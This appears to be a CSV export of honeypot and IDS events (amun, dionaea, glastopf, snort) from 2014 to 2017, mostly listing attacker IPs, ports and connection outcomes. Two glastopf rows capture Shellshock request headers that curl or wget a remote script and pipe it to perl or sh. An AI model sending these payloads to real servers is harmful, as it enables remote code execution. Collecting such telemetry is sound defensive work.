id,ident,normalized,timestamp,channel,pattern,filename,request_raw,request_url,attackerIP,attackerPort,victimPort,victimIP,connectionType,connectionProtocol,priority,header,signature,sensor,connectionTransport,remoteHostname
548fdd219f8c6d3afa8304cd,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-12-16T07:20:01.526+0000,amun.events,,,,,54.169.153.72,52371.0,443.0,172.31.13.124,initial,,,,,,,
5608ee5a9f8c6d649a2f0402,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-09-28T07:38:02.300+0000,dionaea.connections,,,,,58.218.213.208,39116.0,3128.0,162.244.30.100,reject,pcap,,,,,tcp,
560eeeaf9f8c6d649a2f18ec,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-10-02T20:53:03.284+0000,dionaea.connections,,,,,115.239.248.30,6000.0,80.0,162.244.30.100,reject,pcap,,,,,tcp,
58aef8539f8c6d649a3eeca4,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-02-23T14:57:23.048+0000,dionaea.connections,,,,,1.162.236.160,6000.0,8118.0,162.244.30.100,reject,pcap,,,,,tcp,
584d7f889f8c6d649a38411e,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T16:32:08.035+0000,dionaea.connections,,,,,163.172.67.30,54338.0,47254.0,162.244.30.100,reject,pcap,,,,,tcp,
584d68569f8c6d649a3717e2,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T14:53:10.831+0000,dionaea.connections,,,,,163.172.67.30,48391.0,13401.0,162.244.30.100,reject,pcap,,,,,tcp,
565793b59f8c6d649a303fed,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-11-26T23:20:21.634+0000,dionaea.connections,,,,,::ffff:217.172.189.173,5074.0,5060.0,::,connect,SipSession,,,,,udp,
5566d3559f8c6d649a2b36ac,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-28T08:35:33.048+0000,amun.events,,,,,198.154.63.131,53593.0,80.0,172.31.13.124,initial,,,,,,,
544ccd8e9f8c6d41306d6830,a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-26T10:31:42.027+0000,glastopf.events,head,,"HEAD / HTTP/1.1
Accept-Encoding: identity
Host: 54.68.96.53
User-Agent: Cloud mapping experiment. Contact research@pdrlabs.net",/,54.80.141.254,58424.0,80.0,0,,,,,,,,
5881403e9f8c6d649a3d1253,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-19T22:39:58.228+0000,dionaea.connections,,,,,162.254.205.73,40355.0,5803.0,162.244.30.100,reject,pcap,,,,,tcp,
55875f179f8c6d649a2ca8f8,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-06-22T01:04:23.730+0000,amun.events,,,,,98.232.138.20,52832.0,23.0,172.31.14.66,initial,,,,,,,
55796fd69f8c6d649a2c1f55,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-06-11T11:24:06.002+0000,amun.events,,,,,82.209.153.75,51526.0,23.0,172.31.14.66,initial,,,,,,,
546f522a9f8c6d41306e4a0d,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-11-21T14:54:34.046+0000,amun.events,,,,,104.171.112.125,37956.0,110.0,172.31.13.124,initial,,,,,,,
57641fbe9f8c6d649a32cb4d,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,True,2016-06-17T16:05:18.722+0000,snort.alerts,,,,,0.0.0.0,,,255.255.255.255,Potentially Bad Traffic,UDP,2,1:527:8,BAD-TRAFFIC same SRC/DST,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,,
5883249b9f8c6d649a3e5735,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-21T09:06:35.055+0000,dionaea.connections,,,,,162.254.205.73,40028.0,14451.0,162.244.30.100,reject,pcap,,,,,tcp,
57b0c80f9f8c6d649a3498b9,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-08-14T19:35:43.797+0000,dionaea.connections,,,,,188.166.222.214,46964.0,3390.0,162.244.30.100,reject,pcap,,,,,tcp,
5584f6d39f8c6d649a2c9808,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-06-20T05:14:59.231+0000,amun.events,,,,,220.128.136.157,55468.0,3389.0,172.31.14.66,initial,,,,,,,
5443fa9d9f8c6d41306d159e,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-19T17:53:33.024+0000,amun.events,,,,,71.190.176.162,1484.0,110.0,172.31.14.66,initial,,,,,,,
5441bb7c9f8c6d41306ce761,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-18T00:59:40.568+0000,amun.events,,,,,54.169.82.200,46825.0,443.0,172.31.13.124,initial,,,,,,,
58718de09f8c6d649a3c24be,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-08T00:54:56.902+0000,dionaea.connections,,,,,83.136.86.188,34978.0,5038.0,162.244.30.100,reject,pcap,,,,,tcp,
58581d8f9f8c6d649a39c363,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-19T17:49:03.489+0000,dionaea.connections,,,,,::ffff:185.40.4.65,5070.0,5060.0,::,connect,SipCall,,,,,udp,
5476783f9f8c6d41306e7ad8,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2014-11-27T01:02:55.794+0000,amun.events,,,,,110.143.3.123,2791.0,25.0,172.31.14.66,initial,,,,,,,
58b2034d9f8c6d649a3f12fd,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-02-25T22:21:01.612+0000,dionaea.connections,,,,,59.182.141.39,48900.0,7547.0,162.244.30.100,reject,pcap,,,,,tcp,
54ceef879f8c6d649a2689c4,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-02-02T03:31:19.620+0000,amun.events,,,,,27.3.56.60,2063.0,139.0,172.31.14.66,initial,,,,,,,
5435948d9f8c6d41306be5e8,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-08T19:46:21.791+0000,amun.events,,,,,61.153.106.24,3167.0,135.0,172.31.13.124,initial,,,,,,,
54fa6a169f8c6d649a27903d,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-03-07T03:01:42.838+0000,dionaea.connections,,,,,217.29.58.142,51584.0,3128.0,162.244.30.100,reject,pcap,,,,,tcp,
58abf0859f8c6d649a3eced4,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-02-21T07:47:17.808+0000,dionaea.connections,,,,,39.119.76.37,51551.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
5881f9d39f8c6d649a3d9529,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-20T11:51:47.978+0000,dionaea.connections,,,,,162.254.205.73,40355.0,12793.0,162.244.30.100,reject,pcap,,,,,tcp,
55623ffe9f8c6d649a2b04e3,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-24T21:17:50.495+0000,amun.events,,,,,198.101.193.22,60013.0,25.0,172.31.13.124,initial,,,,,,,
57c7cba19f8c6d649a352649,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-09-01T06:33:05.452+0000,dionaea.connections,,,,,86.122.48.253,36082.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
54d08ea99f8c6d649a26a28f,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-02-03T09:02:33.485+0000,amun.events,,,,,202.109.143.35,4681.0,8080.0,172.31.13.124,initial,,,,,,,
55a857019f8c6d649a2dd895,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-07-17T01:14:41.126+0000,amun.events,,,,,24.173.207.82,44168.0,23.0,172.31.13.124,initial,,,,,,,
565888e19f8c6d649a309105,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-11-27T16:46:25.896+0000,dionaea.connections,,,,,::ffff:88.150.252.176,5079.0,5060.0,::,connect,SipSession,,,,,udp,
584d78779f8c6d649a37dec9,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T16:01:59.313+0000,dionaea.connections,,,,,163.172.67.30,52536.0,36020.0,162.244.30.100,reject,pcap,,,,,tcp,
553a78949f8c6d649a2955eb,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-04-24T17:08:36.730+0000,amun.events,,,,,94.76.204.199,51398.0,80.0,172.31.13.124,initial,,,,,,,
576208cf9f8c6d649a32bd67,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,True,2016-06-16T02:02:55.857+0000,snort.alerts,,,,,0.0.0.0,,,255.255.255.255,Potentially Bad Traffic,UDP,2,1:527:8,BAD-TRAFFIC same SRC/DST,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,,
543ed4749f8c6d41306cd237,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-15T20:09:24.359+0000,amun.events,,,,,54.235.83.160,58322.0,3389.0,172.31.13.124,initial,,,,,,,
5484c1c59f8c6d41306ec286,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2014-12-07T21:08:21.471+0000,amun.events,,,,,204.188.195.74,3760.0,110.0,172.31.14.66,initial,,,,,,,
555f70d19f8c6d649a2aeb94,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-22T18:09:21.833+0000,dionaea.connections,,,,,61.160.213.32,33315.0,3128.0,162.244.30.100,reject,pcap,,,,,tcp,
584d88dd9f8c6d649a38bdfe,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T17:11:57.265+0000,dionaea.connections,,,,,163.172.67.30,56728.0,62166.0,162.244.30.100,reject,pcap,,,,,tcp,
5594d3d49f8c6d649a2d5365,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-07-02T06:01:56.961+0000,amun.events,,,,,222.186.21.41,1253.0,8080.0,172.31.13.124,initial,,,,,,,
544a74469f8c6d41306d5861,7f3527b2-468b-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-24T15:46:14.532+0000,glastopf.events,unknown,,"GET /cgi-bin/newsdesk.cgi HTTP/1.0
Cache-Control: no-cache
Connection: Keep-Alive
Cookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl
Pragma: no-cache
Referer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl
Test: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl
User-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl",/cgi-bin/newsdesk.cgi,178.218.210.59,36253.0,80.0,0,,,,,,,,
54b09de59f8c6d3afa837981,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-01-10T03:35:01.129+0000,amun.events,,,,,104.192.103.20,37087.0,25.0,172.31.13.124,initial,,,,,,,
54e829a09f8c6d649a27319e,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-02-21T06:45:52.485+0000,amun.events,,,,,124.80.240.45,56504.0,23.0,172.31.14.66,initial,,,,,,,
584d78859f8c6d649a37dfc1,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T16:02:13.364+0000,dionaea.connections,,,,,163.172.67.30,52536.0,36082.0,162.244.30.100,reject,pcap,,,,,tcp,
57d5d02d9f8c6d649a357c3f,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-09-11T21:44:13.795+0000,dionaea.connections,,,,,78.31.69.187,13301.0,1028.0,162.244.30.100,reject,pcap,,,,,tcp,
58583a009f8c6d649a39e14d,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-19T19:50:24.742+0000,dionaea.connections,,,,,::ffff:185.40.4.65,5071.0,5060.0,::,connect,SipSession,,,,,udp,
55a619889f8c6d649a2dc7b9,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-07-15T08:27:52.630+0000,amun.events,,,,,173.254.203.161,1171.0,3389.0,172.31.14.66,initial,,,,,,,
57dade779f8c6d649a3591c0,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-09-15T17:46:31.146+0000,dionaea.connections,,,,,111.251.99.131,6000.0,8118.0,162.244.30.100,reject,pcap,,,,,tcp,
58821e979f8c6d649a3dafc6,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-20T14:28:39.950+0000,dionaea.connections,,,,,162.254.205.73,40355.0,23436.0,162.244.30.100,reject,pcap,,,,,tcp,
55bc086a9f8c6d649a2e412c,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-07-31T23:44:42.734+0000,dionaea.connections,,,,,::ffff:199.168.141.86,5070.0,5060.0,::,connect,SipSession,,,,,udp,
55c1714e9f8c6d649a2e5163,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-08-05T02:13:34.663+0000,dionaea.connections,,,,,::ffff:91.218.112.246,5071.0,5060.0,::,connect,SipSession,,,,,udp,
556b37619f8c6d649a2b8619,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-31T16:31:29.022+0000,amun.events,,,,,182.118.53.164,56559.0,3389.0,172.31.13.124,initial,,,,,,,
5848b4149f8c6d649a366448,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-08T01:15:00.278+0000,dionaea.connections,,,,,121.20.165.144,27256.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
584d72269f8c6d649a378e1d,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T15:35:02.441+0000,dionaea.connections,,,,,163.172.67.30,50904.0,26105.0,162.244.30.100,reject,pcap,,,,,tcp,
55f15c2f9f8c6d649a2ebd72,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-09-10T10:32:15.618+0000,dionaea.connections,,,,,::ffff:23.92.94.65,5078.0,5060.0,::,connect,SipSession,,,,,udp,
57c58b449f8c6d649a3516a8,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-08-30T13:33:56.824+0000,dionaea.connections,,,,,123.20.129.91,44769.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
5564d9869f8c6d649a2b1f4c,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-26T20:37:26.902+0000,amun.events,,,,,112.220.247.146,39705.0,3389.0,172.31.13.124,initial,,,,,,,
584d72cc9f8c6d649a379565,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T15:37:48.583+0000,dionaea.connections,,,,,163.172.67.30,51076.0,27266.0,162.244.30.100,reject,pcap,,,,,tcp,
543a60ae9f8c6d41306cb2f8,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-12T11:06:22.386+0000,amun.events,,,,,222.175.241.131,36790.0,80.0,172.31.14.66,initial,,,,,,,
58589eb59f8c6d649a3a4aaa,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-20T03:00:05.151+0000,dionaea.connections,,,,,::ffff:185.40.4.65,5070.0,5060.0,::,connect,SipCall,,,,,udp,
587a45339f8c6d649a3cb289,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-14T15:35:15.177+0000,dionaea.connections,,,,,80.177.170.175,23769.0,7547.0,162.244.30.100,reject,pcap,,,,,tcp,
5594a4d09f8c6d649a2d4dff,a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e,True,2015-07-02T02:41:20.624+0000,glastopf.events,tomcat_manager,,"GET /manager/html HTTP/1.1
Accept: text/html, application/xhtml+xml, */*
Authorization: Basic Og==
Host: 54.68.96.53:80
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)",/manager/html,222.186.50.47,1274.0,80.0,0,,,,,,,,
54fc940c9f8c6d649a27a0ea,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-03-08T18:25:16.224+0000,dionaea.connections,,,,,66.240.236.119,20819.0,4443.0,162.244.30.100,reject,pcap,,,,,tcp,
579be5aa9f8c6d649a34052b,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,True,2016-07-29T23:24:26.369+0000,snort.alerts,,,,,0.0.0.0,,,255.255.255.255,Potentially Bad Traffic,UDP,2,1:527:8,BAD-TRAFFIC same SRC/DST,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,,
584dc71e9f8c6d649a38e00f,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T21:37:34.329+0000,dionaea.connections,,,,,77.46.238.129,12099.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
5854c24b9f8c6d649a395f39,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-17T04:42:51.743+0000,dionaea.connections,,,,,185.35.62.46,60224.0,8883.0,162.244.30.100,reject,pcap,,,,,tcp,
55a1b9509f8c6d649a2da989,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-07-12T00:48:16.108+0000,dionaea.connections,,,,,::ffff:219.151.9.44,1064.0,3306.0,::ffff:162.244.30.100,accept,mysqld,,,,,tcp,
543a997b9f8c6d41306cb376,a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-12T15:08:43.832+0000,glastopf.events,login,,"GET /login.cgi HTTP/1.1
Accept: */*
Host: 54.68.96.53
Referer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh
User-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh",/login.cgi,112.25.208.212,55962.0,80.0,0,,,,,,,,
584d5eda9f8c6d649a36b5d2,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T14:12:42.229+0000,dionaea.connections,,,,,163.172.67.30,45964.0,1766.0,162.244.30.100,reject,pcap,,,,,tcp,
554e60349f8c6d649a29f58c,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-09T19:29:56.733+0000,amun.events,,,,,80.82.78.21,33056.0,80.0,172.31.13.124,initial,,,,,,,
5560a9419f8c6d649a2af90e,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-23T16:22:25.051+0000,amun.events,,,,,85.186.1.207,4789.0,445.0,172.31.14.66,exploit,,,,,,,
584d75f69f8c6d649a37bc61,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T15:51:18.214+0000,snort.alerts,,,,,163.172.67.30,,,162.244.30.100,Misc activity,ICMP,3,1:486:4,ICMP Destination Unreachable Communication with Destination Host is Administratively Prohibited,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,,
54d56d739f8c6d649a26c68d,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-02-07T01:42:11.701+0000,amun.events,,,,,54.175.72.187,56578.0,80.0,172.31.13.124,initial,,,,,,,
565785069f8c6d649a303f49,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-11-26T22:17:42.943+0000,dionaea.connections,,,,,121.133.158.108,29496.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
58817c599f8c6d649a3d3d33,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-20T02:56:25.702+0000,dionaea.connections,,,,,162.254.205.73,40355.0,10029.0,162.244.30.100,reject,pcap,,,,,tcp,
549d04359f8c6d3afa8342da,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-12-26T06:46:13.596+0000,amun.events,,,,,69.2.50.198,52136.0,3389.0,172.31.13.124,initial,,,,,,,
566afd0d9f8c6d649a30de61,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-12-11T16:42:53.638+0000,dionaea.connections,,,,,5.152.216.226,41820.0,17145.0,162.244.30.100,reject,pcap,,,,,tcp,
569a6a159f8c6d649a31d126,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-01-16T16:04:37.759+0000,dionaea.connections,,,,,58.218.204.225,42178.0,8888.0,162.244.30.100,reject,pcap,,,,,tcp,
54c6447d9f8c6d3afa83b3a1,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-01-26T13:43:25.123+0000,amun.events,,,,,218.5.72.78,61499.0,3389.0,172.31.13.124,initial,,,,,,,
5686a0549f8c6d649a318c0d,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-01-01T15:50:44.160+0000,dionaea.connections,,,,,::ffff:85.25.207.170,8366.0,59574.0,::ffff:162.244.30.100,connect,RtpUdpStream,,,,,udp,::ffff:85.25.207.170
576cde2e9f8c6d649a330856,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,True,2016-06-24T07:15:58.645+0000,snort.alerts,,,,,0.0.0.0,,,255.255.255.255,Potentially Bad Traffic,UDP,2,1:527:8,BAD-TRAFFIC same SRC/DST,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,,
551c69159f8c6d649a28b6af,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-04-01T21:54:29.242+0000,amun.events,,,,,98.102.80.70,52655.0,25.0,172.31.14.66,initial,,,,,,,
5858a7719f8c6d649a3a54d5,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-20T03:37:21.871+0000,dionaea.connections,,,,,::ffff:185.40.4.65,5071.0,5060.0,::,connect,SipCall,,,,,udp,
5435af7b9f8c6d41306c0893,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-08T21:41:15.598+0000,amun.events,,,,,61.153.106.24,20721.0,135.0,172.31.13.124,initial,,,,,,,
574debb79f8c6d649a323a19,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-05-31T19:53:27.059+0000,dionaea.connections,,,,,92.115.12.60,2309.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
5486be3d9f8c6d41306ee988,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2014-12-09T09:17:49.708+0000,amun.events,,,,,54.169.31.13,32865.0,443.0,172.31.14.66,initial,,,,,,,
569839c19f8c6d649a31c901,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-01-15T00:13:53.115+0000,dionaea.connections,,,,,58.218.204.225,42178.0,8888.0,162.244.30.100,reject,pcap,,,,,tcp,
55754c119f8c6d649a2bf8cb,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-06-08T08:02:25.987+0000,amun.events,,,,,188.230.174.139,38117.0,23.0,172.31.14.66,initial,,,,,,,
57da686b9f8c6d649a358fd9,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-09-15T09:22:51.261+0000,dionaea.connections,,,,,113.175.219.82,1927.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
55a9c5229f8c6d649a2df43c,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-07-18T03:16:50.706+0000,dionaea.connections,,,,,198.20.69.98,6707.0,503.0,162.244.30.100,reject,pcap,,,,,tcp,
576b0b669f8c6d649a32fb03,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-06-22T22:04:22.865+0000,dionaea.connections,,,,,59.127.34.189,40699.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
550a2ad49f8c6d649a27fa7f,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-03-19T01:48:04.866+0000,amun.events,,,,,189.72.99.232,27005.0,25.0,172.31.14.66,initial,,,,,,,
5435fc579f8c6d41306c6f5c,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-09T03:09:11.039+0000,amun.events,,,,,61.153.106.24,30110.0,135.0,172.31.13.124,initial,,,,,,,
5881bcb39f8c6d649a3d6d69,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-20T07:30:59.812+0000,dionaea.connections,,,,,162.254.205.73,40355.0,36534.0,162.244.30.100,reject,pcap,,,,,tcp,
584d7ec09f8c6d649a3833fc,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T16:28:48.491+0000,snort.alerts,,,,,163.172.67.30,,,162.244.30.100,Misc activity,ICMP,3,1:486:4,ICMP Destination Unreachable Communication with Destination Host is Administratively Prohibited,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,,
584d7cc59f8c6d649a3819de,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T16:20:21.145+0000,dionaea.connections,,,,,163.172.67.30,53626.0,42952.0,162.244.30.100,reject,pcap,,,,,tcp,
54356bfd9f8c6d41306bb046,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-08T16:53:17.778+0000,amun.events,,,,,61.153.106.24,23455.0,135.0,172.31.13.124,initial,,,,,,,
55561f509f8c6d649a2a7e9c,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-15T16:31:12.315+0000,amun.events,,,,,66.191.136.146,50149.0,110.0,172.31.13.124,initial,,,,,,,
5881d5569f8c6d649a3d7f30,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-20T09:16:06.793+0000,dionaea.connections,,,,,162.254.205.73,40355.0,16467.0,162.244.30.100,reject,pcap,,,,,tcp,
584d6fe59f8c6d649a376cae,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T15:25:25.006+0000,dionaea.connections,,,,,163.172.67.30,50327.0,22651.0,162.244.30.100,reject,pcap,,,,,tcp,
587ab6909f8c6d649a3cbb40,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-14T23:38:56.091+0000,dionaea.connections,,,,,163.172.116.24,54036.0,3393.0,162.244.30.100,reject,pcap,,,,,tcp,
57c61c8e9f8c6d649a351879,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-08-30T23:53:50.208+0000,dionaea.connections,,,,,190.82.102.54,17946.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
584d7ebf9f8c6d649a383216,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T16:28:47.138+0000,snort.alerts,,,,,163.172.67.30,,,162.244.30.100,Misc activity,ICMP,3,1:486:4,ICMP Destination Unreachable Communication with Destination Host is Administratively Prohibited,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,,
58718d509f8c6d649a3c1b76,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-08T00:52:32.258+0000,dionaea.connections,,,,,83.136.86.188,60994.0,5038.0,162.244.30.100,reject,pcap,,,,,tcp,
58b4dd749f8c6d649a3f3f9a,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,False,2017-02-28T02:16:20.240+0000,dionaea.connections,,,,,200.119.201.67,23776.0,2323.0,162.244.30.100,reject,pcap,,,,,tcp,
58504a779f8c6d649a3901e8,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-13T19:22:31.372+0000,dionaea.connections,,,,,83.211.81.171,63112.0,7547.0,162.244.30.100,reject,pcap,,,,,tcp,
